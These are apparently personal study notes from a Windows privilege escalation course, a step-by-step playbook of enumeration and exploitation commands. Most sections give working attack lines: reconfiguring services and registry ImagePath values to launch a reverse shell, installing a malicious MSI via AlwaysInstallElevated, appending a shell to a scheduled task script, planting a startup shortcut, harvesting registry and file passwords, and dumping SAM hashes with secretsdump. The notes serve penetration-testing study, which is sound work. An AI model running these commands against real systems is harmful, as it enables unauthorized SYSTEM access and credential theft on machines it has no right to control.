Tools used in the course:

PowerUp: https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1

SharpUp: https://github.com/GhostPack/SharpUp

Seatbelt: https://github.com/GhostPack/Seatbelt

Winpeas: https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS

Accesschk: https://learn.microsoft.com/it-it/sysinternals/downloads/accesschk 

Pre-Compiled binaries (some of them and some other more):  https://github.com/r3motecontrol/Ghostpack-CompiledBinaries

# Kernel Exploits

1. Enumerate Windows version / patch level (`systeminfo`)
2. Find exploits (Google, ExploitDB, GitHub)
3. Compile and run

Use as last resort! They might be unreliable.
After you got the output from systeminfo, you can run one of these:

`Windows Exploit Suggester`:
https://github.com/bitsadmin/wesng

`Watson`:
https://github.com/rasta-mouse/Watson

Then you can search for pre-compiled binaries, or compile them yourself:

`Pre-Compiled Kernel Exploits`:
https://github.com/SecWiki/windows-kernel-exploits

Example:
`python wes.py systeminfo.txt -i 'Elevation of Privilege' --exploits-only`

# Service Exploits

General useful commands:

- Query the configuration of a service:	
`> sc.exe qc <name>`
- Query the current status of a service:
`> sc.exe query <name>`
- Modify a configuration option of a service:
`> sc.exe config <name> <option>= <value>` ### Syntax is important!
- Start/Stop a service:
`net start/stop <name>` or `sc.exe start/stop <name>`

These are the main service misconfigurations:

1. Insecure Service Properties
2. Unquoted Service Path
3. Weak Registry Permissions
4. Insecure Service Executables
5. DLL Hijacking

## Insecure Service Permissions

Each service has an ACL which defines certain service-specific permissions. Mainly, we are looking for:

- Useful permissions e.g. `SERVICE_STOP, SERVICE_START`
- Dangerous permissions (not for us :P) e.g. `SERVICE_CHANGE_CONFIG, SERVICE_ALL_ACCESS`

The goal is to change the configuration of a service by changing the executable the service uses to one of our own.

**WARNING**: If you can change a service configuration, but you can't stop/start a service, you may not able to escalate! 

To enum this, launch winpeas with:

`winpeas.exe servicesinfo`

And look at the section `Modifiable Services`

For example, if we see the `daclsvc` service in the winpeas output, we can check it with `accesschk.exe`:

`.\accesschk.exe /accepteula -uwcqv user daclsvc`

If we see the "Dangerous" permissions talked above, then you can proceed to change the executables the service uses to escalate privileges. More info about the service can be obtained with:

`sc qc daclsvc` and look at `BINARY_PATH_NAME`. `SERVICE_START_NAME` is the privilege context which the executable is run.

Now let's change it:

`sc config daclsvc binpath= "\"C:\temp\reverse_shell.exe\""`

Then just stop/start the service. GG!



## Unquoted Service Path

Executables in Windows can be run without using their extension (`whoami` instead of `whoami.exe`)

Some executables take arguments separated by spaces, e.g. `someprog.exe arg1 arg2 ...`

This behaviour leads to ambiguity and can be exploited when absolute paths that are unquoted contain spaces.

For example, consider the following unquoted path:

`C:\Program Files\Some Dir\SomeProgram.exe`

For us, ofc the program to execute is `SomeProgram.exe`, but for the OS is not. It could be the `Program` Executables with `Files\Some` and `Dir\SomeProgram.exe` as arguments, or `Some` with `Dir\SomeProgram.exe` as argument. Windows tries all the combination in turn.

If we can write to a location Windows checks before the actual executable, we can trick the service into executing it instead.

We can run winpeas to enum this type of misconfiguration:

`.\winpeas.exe quiet servicesinfo` 

And look in the section `Interesting Services -non Microsoft-`

Winpeas should flag it already as unquoted service path vulnerable (`No quotes and space detected`)

Again, first check you can stop/start the service.

If we find it for example in:

`C:\Program Files\Unquoted Path Service\Common Files\unquotedps.exe` that is run by the `unquotedsvc` service.

We need now to enumerate if we have Write privileges in the location that preceed the actual exectuable

`.\accesschk.exe /accepteula -uwdq C:\`
`.\accesschk.exe /accepteula -uwdq "C:\Program Files\"` 
`.\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"`

Ecc... until we find a folder where our user has the W privilege (write). Let's say our last enumerated folder has write executables, this means Windows will treat `Common` as an exectuable argument. We can so craft a malicious binary called `Common.exe` and place it in `C:\Program Files\Unquoted Path Service\Common.exe`. 

Stop and start the service, and we should get a connection. GG!


## Weak Registry Permissions

The Windows registry stores entries for each service.

Registry have ACLs, if the ACL is misconfigured, it may be possible to modfiy a service's configuration even if we cannot modify the service directly.

Run winpeas to enum this misconfiguration:

`.\winpeas.exe quiet servicesinfo`

Then, look at the `Looking if you can modify any service registry()`. If you see an `Interactive [TakeOwnership]` then there's a misconfiguration. You can verify with:

`Get-ACL <REGISTRY_NAME>`
`Get-ACL HKLM:\System\CurrentControlSet\Services\regsvc | Format-List`
`.\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc`

If you see an `RW NT AUTHORITY\INTERACTIVE` the `INTERACTIVE` keyword mean any authenticated user inside the system. 

Always double check if you can start/stop the service!

If you can, then you can query the registry:

`reg query HKLM\SYSTEM\CurrentControlSet\services\regsvc` and look at the `ImagePath`

We can change the `ImagePath` of the registry with an executable with a reverse shell, very similar case to the `binpath` change:

`reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\temp\reverse_shell.exe /f`

start&stop the service and GG!



## Insecure Service Executables

If the original service executable is modifiable by our user, we can simply replace it with our reverse shell.

Remember to backup!

Enum with winpeas this misconfiguration:

`.\winpeas.exe quiet servicesinfo`

And look at the `Interesting Services -non Microsoft-` you should look for those lines with

`File Permissions: Everyone [AllAccess]`

You can always verify with accesschk:

`.\accesschk.exe /accepteula -quvw <EXE_PATH>`
Look for `FILE_ALL_ACCESS` or just `RW`

Check if you can stop&start the service

`.\accesschk.exe /accepteula -uvqc <service_name>`

Then just copy and paste our shell to the location, start&stop the service et voil√†!





## DLL Hijacking

Ofter a service will try to load funcionality from a library called DLL. Whatever functionality the DLL provides, it will be executed in the same privileges as the service that loaded it.

If a DLL is loaded with an absolute path, it might be possible to escalate privileges if that DLL is writable by our user.

Mainly, it's possible to leverage the vulnerability when a DLL is missing from the system, and our user has write access to a directory within the PATH that windows search for DLLs in.

Detection is harder compared to previous services, so we need to have a more manual approach.

With winpeas, we can enum this misconfiguration with:

`.\winpeas.exe quiet servicesinfo`

And then look at the `Interesting Services -non Microsoft-`. We also need to check if we have some write privileges in one of the folders specified in the `PATH` variable (winpeas will tell us that). Ofc as always we need to check if we can start/stop the service. So generally we look for those executables that stand out, there isn't a way to be sure that it's DLL hijackable.

We can query the executable:

`sc qc dllsvc`

And look at the executable the service uses. We need to transfer the binary to one windows VM that we have admin privileges because we need to run procmon in order to see what DLL it requires.

Run procmon with admin privileges. Stop and clear the (current) capture. Press **CTRL + L** add a new filter with `Process Name - is ` maching the exectuable (e.g `dllhijackableservice.exe`). De-select the `Show registry action` and `Show network actvity` and start the capture. 

Now start the service and look at the capture (i thnk executing the binary is also fine?). In the `result` column we should look for `NAME NOT FOUND` and see the type of DLL it is trying to reach (e.g. `hijackme.dll`). 

At this point we can create a DLL with msfvenom specifying the same name we found earlier and put it in the writable share (within the `PATH` env variable!) we also found earlier

Now stop/start the service and we should've gotten a shell!

# Registry Exploits

Windows can be configured to run commands at startup, with elevated privileges. These "autoruns" are configured in the Registry. If you are able to write to an AutoRun executable, and you can restart the system (or wait to be restarted) you may be able to escalate privileges.

To enum this misconfiguration, run winpeas:

`.\winpeas.exe quiet applicationsinfo` 

And look at the 

`Autorun Applications` section

You wanna look for  `FilePerms: Everyone[All Access]` then query the registry:

`reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`

You should look for some variable name specifying the vulnerable program also included in the winpeas output, for example (but generally check them all)

`My Program   REG_SZ      "C:\Program Files\Autorun Program\program.exe`

Next, use accesschk to check the permission:

`.\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe`

Look for `FILE_ALL_ACCESS` privilege.

To exploit it just copy a malicious `program.exe` to the same folder, and restart the pc. Also it could be possible that restarting the PC using a low privileged user might not work so it's the best if you can restart it as an admin (weird scenario but whatever).

---

The other way is the `AlwaysInstallElevated`. This leverages a Windows misconfiguration that allows for MSI installers to be run with elevated privileges. For this just create a payload with msfvenom and run it.

To enum this miscoonfiguration, you want to run these checks:

`reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated` 

and

`reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`

If either of these are missing or disabled, the exploit will not work (they should have the value set to "1"). Create the msfvenom payload and run this:

`msiexec /quiet /qn /i reverse_shell.msi`

ggez



# Juicy Passwords

Windows can be vulnerable because several features of Windows store passwords insecurely.

Plenty of programs store configuration options in the Windows registry, and sometimes password (in plaintext!). It is always worth searching passwords in registries.

`reg query HKLM /f password /t REG_SZ /s` ### LM = Local Machine
`reg query HKCU /f password /t REG_SZ /s` ### CU = Current User

Beware! The above commands will generate A BIG output. 

Generally winpeas will list all the credentails it can find, so look at it before. Then, you can make some manual enumeration:

`reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon`

Look for `DefaultUsername` and `DefaultPassword`.

`reg query "HKCU\Software\SimonTatham\PuTTy\Sessions" /s`

Also, you can look for "Saved Creds". Windows allows users to save their crendetials to the system, and these saved creds can be used to bypass this requirement. Again winpeas will enum for this but you can do it manually too:

`cmdkey /list`

If you find something, then:

`runas /savecred /user:<name_in_cmdkey_cmd> C:\temp\reverse_shell.exe`

Some administrators will leave also configuration files on the system with passwords in them. The `Unattend.xml` file is an example. We can search for those with some cmds:

Search for files in the current directory with "pass" in the name, or ending in ".config"
`dir /s *pass* == *.config`

Recursively search for files in the current directory that contain the word "password" and also end in either .xml, .ini or .txt:
`findstr /si password *.xml *.ini *.txt`

We can run winpeas with that to enum this type of thing:

`.\winpeas.exe quiet filesinfo`

Sometimes the SAM database is not stored securely and you can copy it (along with the SYSTEM hive). Usually it is located in:

`C:\Windows\System32\config`

But some backup files may exist in:

`C:\Windows\Repair` or `C:\Windows\System32\config\RegBack`

The files are locked while Windows is running.

The course uses `creddump7` to dump the hashes in Kali but i think `pypykatz` can be used too:

`pypykatz registry system.save --sam sam.save --security security.save`

or even secretsdump from impacket:

`./secretsdump.py -sam sam.save -security security.save -system system.save LOCAL`

Then crack the hash or do PtH, whatever it works.

# Scheduled Tasks

Windows can be configured to run tasks at specific times, periodically (e.g. every 5 mins) or when triggered by some event. Tasks usually run with the privileges of the user who created them, however administrator can configure tasks to run as other users, including SYSTEM.

There is no easy method for enumerating custom tasks that belong to other users as a low privileged user account:

List all scheduled tasks your user can see:
`schtasks /query /fo LIST /v`

In powershell:
`Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State`

Or generally we need to rely on other clues, such as script or log files that indicate a task is running.

If we find some file that may be scheduled, we can check our privileges over it:

`accesschk.exe /accepteula -quv user CleanUp.ps1`

If we have write privileges, we can "append" our reverse_shell executable to the file (backup if necessary):

`echo C:\Temp\reverse_shell.exe >> CleanUp.ps1`

# Insecure GUI Apps

Users could be granted the permission to run certain GUI apps with administrator privileges.

There are often numerous ways to spawn command prompts from within GUI apps, including using native Windows functionality. 

Unfortunately, the course doesn't show a way to enum this, so you generally wanna do manual enumeration. If we find we can run an app with administrative privileges (e.g. Paint), we can open it and check wheter it runs with admin privs:

`tasklist /V | findstr mspaint.exe`

For example, within Paint, we can go to `File -> Open` and this will open the usual Windows GUI folder asking for a file to be opened. In the "Path bar" (i don't know how to call it lol) we can specify the path for the `cmd.exe` and press open. This will open up a cmd.exe with high privileges!


# Startup Apps

Each user can define apps taht start when they log in, by placing shortcuts to them in a specific directory.

Windows also has a startup directory for apps that should start for all users:

`C:\ProgramData\Microsoft\WIndows\Start Menu\Programs\StartUp`

If we can create files in this directory, we can use our reverse shell executable and escalate privileges when an admin logs in.

You can enum with accesschk.exe:

`.\accesschk.exe /accepteula -d C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp`

If we have write privileges, we can create a VB script to create a shortcut (otherwise it does not work):


``` vb
Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "C:\Temp\reverse_shell.exe"
oLink.Save
```

then

`cscript CreateShortcut.vbs`

This will put the shortcut in the startup folder. Just start a netcat listener and once startup it will trigger it.




# Installed Applications

This generally takes manual enum. There is not a lot to say. We can run seatbelt to enum non-standard-processes:

`.\seatbelt.exe NonstandardProcesses`

or with winpeas:

`.\winpeas.exe quiet procesinfo` ### Yes there is a typo, in case might be "processinfo" depending on the winpeas version!

The just Google/ExploitDB for the glory.




# Hot Potato

Hot potato is the name of an attack that uses a spoofing attack along with an NTLM relay attack to gain SYSTEM privileges. The attack tricks Windows into authenticating as the SYSTEM user to a fake HTTP server using NTLM. The NTLM credentials then get relayed to SMB in order to gain command execution.

This attack works on Windows 7, 8, early versions of Windows10, and their server counterparts.

`.\potato.exe -ip 192.168.x.y -cmd "C:\Temp\reverse_shell.exe" -enable_httpserver true -enable_defender true -enable_spoof true -enable_exhaust true`

Run&pray

# Token Impersonation

Sorry but this is already covered in CPTS, not gonna take notes on this.

